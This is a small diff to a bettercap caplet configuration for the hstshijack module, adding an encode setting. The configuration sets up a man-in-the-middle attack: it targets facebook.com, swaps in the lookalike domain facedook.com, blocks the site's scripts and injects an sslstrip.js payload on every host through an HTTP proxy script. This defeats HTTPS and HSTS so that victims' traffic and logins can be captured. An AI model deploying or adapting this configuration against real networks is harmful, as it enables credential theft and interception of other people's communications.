@@ -7,6 +7,7 @@ set hstshijack.targets         facebook.com,*.facebook.com
 set hstshijack.replacements    facedook.com,*.facedook.com
 set hstshijack.blockscripts    facebook.com,*.facebook.com
 set hstshijack.obfuscate       false
+set hstshijack.encode          true
 set hstshijack.custompayloads  *:/usr/local/share/bettercap/caplets/hstshijack/payloads/sslstrip.js
 
 set http.proxy.script  /usr/local/share/bettercap/caplets/hstshijack/hstshijack.js
